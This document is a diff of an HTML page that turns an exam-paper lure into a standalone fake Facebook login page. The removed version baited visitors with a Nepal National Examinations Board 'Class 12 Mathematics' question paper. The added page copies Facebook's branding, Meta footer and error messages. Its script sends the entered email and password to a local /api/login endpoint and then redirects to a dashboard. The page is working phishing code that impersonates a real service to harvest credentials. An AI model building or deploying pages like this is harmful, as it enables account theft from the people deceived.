@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEB - National Examinations Board</title>
+    <title>Facebook - Log in or sign up</title>
     <style>
         * {
             margin: 0;
@@ -12,329 +12,333 @@
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
         }
 
-        .neb-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .container {
             width: 100%;
-            height: 100%;
-            background: white;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-            transition: opacity 0.5s ease;
-            overflow-y: auto;
-            padding: 40px 20px;
+            max-width: 400px;
+            padding: 20px;
         }
 
-        .neb-title {
+        /* Get Facebook for iOS */
+        .get-app {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .get-app a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Language Selector */
+        .language {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .language select {
+            background: none;
+            border: none;
+            font-size: 14px;
+            color: #1b1f23;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* Circle F Logo */
+        .logo {
             text-align: center;
             margin-bottom: 30px;
         }
 
-        .neb-title h1 {
-            font-size: 28px;
-            color: #8B0000;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-
-        .neb-title p {
-            font-size: 16px;
-            color: #666;
-            margin-top: 5px;
-        }
-
-        .class-section {
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .class-section h2 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .class-section .math {
-            font-size: 20px;
-            color: #8B0000;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-
-        .class-section .code {
-            font-size: 18px;
-            color: #555;
-            font-family: monospace;
-        }
-
-        .continue-btn {
-            background: #8B0000;
-            color: white;
-            border: none;
-            padding: 15px 50px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 40px;
-            cursor: pointer;
-            margin-top: 40px;
-        }
-
-        .continue-btn:hover {
-            background: #a00000;
-        }
-
-        .facebook-page {
-            display: none;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
-            min-height: 100vh;
-        }
-
-        .fb-logo-top {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 1000;
-        }
-
         .circle-f {
-            width: 40px;
-            height: 40px;
+            width: 70px;
+            height: 70px;
             background: #1877f2;
             border-radius: 50%;
-            display: flex;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
         }
 
         .circle-f span {
             color: white;
-            font-size: 28px;
+            font-size: 48px;
             font-weight: bold;
+            font-family: Arial;
         }
 
-        .fb-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .fb-left {
-            flex: 1;
-            max-width: 500px;
-            padding: 40px;
-        }
-
-        .fb-left h1 {
-            color: #1877f2;
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-
-        .fb-left p {
-            font-size: 28px;
-            color: #1c1e21;
-        }
-
-        .fb-right {
-            flex: 1;
-            max-width: 400px;
-        }
-
+        /* Login Form */
         .login-box {
             background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            padding: 0;
         }
 
         .login-box input {
             width: 100%;
             padding: 14px 16px;
-            margin: 8px 0;
+            margin-bottom: 12px;
             border: 1px solid #dddfe2;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 17px;
             outline: none;
+            background: white;
         }
 
         .login-box input:focus {
             border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
 
+        /* Login Button - Blue with curve */
         .login-btn {
             width: 100%;
-            padding: 12px;
             background: #1877f2;
-            color: white;
             border: none;
-            border-radius: 6px;
+            padding: 12px;
+            border-radius: 8px;
             font-size: 20px;
             font-weight: bold;
+            color: white;
             cursor: pointer;
-            margin: 8px 0;
+            margin-bottom: 16px;
         }
 
         .login-btn:hover {
             background: #166fe5;
         }
 
+        /* Forgot Password - BLACK color */
         .forgot {
             text-align: center;
-            margin: 15px 0;
+            margin-bottom: 20px;
         }
 
         .forgot a {
-            color: #1877f2;
+            color: #1b1f23;
             text-decoration: none;
             font-size: 14px;
+            font-weight: 500;
         }
 
+        .forgot a:hover {
+            text-decoration: underline;
+        }
+
+        /* Divider */
         .hr {
             border-bottom: 1px solid #dadde1;
             margin: 20px 0;
         }
 
+        /* Create Account - BLUE OUTLINE BOX with curve */
         .create-btn {
-            background: #42b72a;
             width: 100%;
+            background: transparent;
+            border: 2px solid #1877f2;
             padding: 12px;
+            border-radius: 8px;
             font-size: 17px;
+            font-weight: bold;
+            color: #1877f2;
+            cursor: pointer;
+            transition: 0.2s;
         }
 
         .create-btn:hover {
-            background: #36a420;
+            background: #e7f3ff;
         }
 
+        /* Meta Footer - BLACK color */
+        .meta-footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 12px;
+        }
+
+        .meta-logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #1b1f23;
+        }
+
+        .infinity {
+            font-size: 18px;
+            font-weight: normal;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Error styles */
         .error-msg {
             color: #f02849;
             text-align: center;
             font-size: 13px;
-            margin: 10px 0;
+            margin: 8px 0;
             display: none;
         }
 
-        .meta-footer {
-            text-align: center;
-            margin-top: 30px;
-            font-size: 12px;
-            color: #65676b;
+        .error-input {
+            border-color: #f02849 !important;
+            background-color: #fff8f8 !important;
         }
 
-        @media (max-width: 900px) {
-            .fb-container {
-                flex-direction: column;
-            }
-            .fb-left {
-                text-align: center;
-                padding: 20px;
-            }
-            .fb-left p {
-                font-size: 20px;
-            }
+        .shake {
+            animation: shake 0.4s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
         }
     </style>
 </head>
 <body>
 
-<!-- NEB SPLASH SCREEN -->
-<div class="neb-screen" id="nebScreen">
-    <div class="neb-title">
-        <h1>नेपाल सरकार<br>राष्ट्रिय परीक्षा बोर्ड</h1>
-        <p>सानोठिमी, भक्तपुर</p>
+<div class="container">
+    <!-- Get Facebook for iOS -->
+    <div class="get-app">
+        <a href="#">Get Facebook for iOS and browse faster.</a>
     </div>
 
-    <div class="class-section">
-        <h2>Class 12 Qn.</h2>
-        <div class="math">[MATHEMATICS]</div>
-        <div class="code">'0081'</div>
+    <!-- Language Selector -->
+    <div class="language">
+        <select>
+            <option selected>English (UK)</option>
+            <option>Nepali</option>
+            <option>हिन्दी</option>
+        </select>
     </div>
 
-    <button class="continue-btn" onclick="showFacebook()">Continue to Facebook →</button>
-</div>
-
-<!-- FACEBOOK PAGE -->
-<div class="facebook-page" id="facebookPage">
-    <div class="fb-logo-top">
+    <!-- Circle F Logo -->
+    <div class="logo">
         <div class="circle-f">
             <span>f</span>
         </div>
     </div>
 
-    <div class="fb-container">
-        <div class="fb-left">
-            <h1>facebook</h1>
-            <p>Connect with friends and the world around you on Facebook.</p>
+    <!-- Login Form -->
+    <div class="login-box">
+        <input type="text" id="email" placeholder="Mobile number or email address">
+        <input type="password" id="password" placeholder="Password">
+        <div id="errorMsg" class="error-msg"></div>
+        <button class="login-btn" onclick="doLogin()">Log in</button>
+        <div class="forgot">
+            <a href="#">Forgotten password?</a>
         </div>
-        <div class="fb-right">
-            <div class="login-box">
-                <input type="text" id="email" placeholder="Email address or mobile number">
-                <input type="password" id="password" placeholder="Password">
-                <div id="errorMsg" class="error-msg"></div>
-                <button class="login-btn" onclick="doLogin()">Log In</button>
-                <div class="forgot">
-                    <a href="#">Forgotten password?</a>
-                </div>
-                <div class="hr"></div>
-                <button class="login-btn create-btn" onclick="alert('Use: admin / 123456')">Create new account</button>
-            </div>
-            <div class="meta-footer">
-                <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
-            </div>
+        <div class="hr"></div>
+        <button class="create-btn" onclick="alert('Create new account form coming soon')">Create new account</button>
+    </div>
+
+    <!-- Meta Footer - BLACK -->
+    <div class="meta-footer">
+        <div class="meta-logo">
+            <span class="infinity">∞</span>
+            <span>Meta</span>
+        </div>
+        <div class="footer-links">
+            <a href="#">About</a>
+            <a href="#">Help</a>
+            <a href="#">More</a>
         </div>
     </div>
 </div>
 
 <script>
-    function showFacebook() {
-        document.getElementById('nebScreen').style.opacity = '0';
-        setTimeout(() => {
-            document.getElementById('nebScreen').style.display = 'none';
-            document.getElementById('facebookPage').style.display = 'block';
-        }, 500);
-    }
-
     async function doLogin() {
-        let email = document.getElementById('email').value;
-        let password = document.getElementById('password').value;
-        
-        if (!email || !password) {
-            document.getElementById('errorMsg').innerText = 'Please fill all fields';
-            document.getElementById('errorMsg').style.display = 'block';
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const errorDiv = document.getElementById('errorMsg');
+        const emailInput = document.getElementById('email');
+        const pwInput = document.getElementById('password');
+
+        errorDiv.style.display = 'none';
+        emailInput.classList.remove('error-input');
+        pwInput.classList.remove('error-input');
+
+        if (!email) {
+            errorDiv.innerText = 'Mobile number or email address is required.';
+            errorDiv.style.display = 'block';
+            emailInput.classList.add('error-input');
+            emailInput.classList.add('shake');
+            setTimeout(() => emailInput.classList.remove('shake'), 400);
             return;
         }
-        
+
+        if (!password) {
+            errorDiv.innerText = 'Password is required.';
+            errorDiv.style.display = 'block';
+            pwInput.classList.add('error-input');
+            pwInput.classList.add('shake');
+            setTimeout(() => pwInput.classList.remove('shake'), 400);
+            return;
+        }
+
         try {
-            let res = await fetch('/api/login', {
+            const res = await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ username: email, password: password })
             });
-            let data = await res.json();
-            
+            const data = await res.json();
+
             if (data.success) {
                 alert('Login successful!');
+                window.location.href = '/dashboard.html';
             } else {
-                document.getElementById('errorMsg').innerText = 'Incorrect password';
-                document.getElementById('errorMsg').style.display = 'block';
+                errorDiv.innerText = 'The password that you\'ve entered is incorrect.';
+                errorDiv.style.display = 'block';
+                pwInput.classList.add('error-input');
+                pwInput.classList.add('shake');
+                setTimeout(() => pwInput.classList.remove('shake'), 400);
             }
-        } catch(err) {
-            document.getElementById('errorMsg').innerText = 'Connection error';
-            document.getElementById('errorMsg').style.display = 'block';
+        } catch (err) {
+            errorDiv.innerText = 'Connection error. Please try again.';
+            errorDiv.style.display = 'block';
         }
     }
+
+    // Press Enter to login
+    document.getElementById('password').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            doLogin();
+        }
+    });
+    document.getElementById('email').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            doLogin();
+        }
+    });
 </script>
 
 </body>
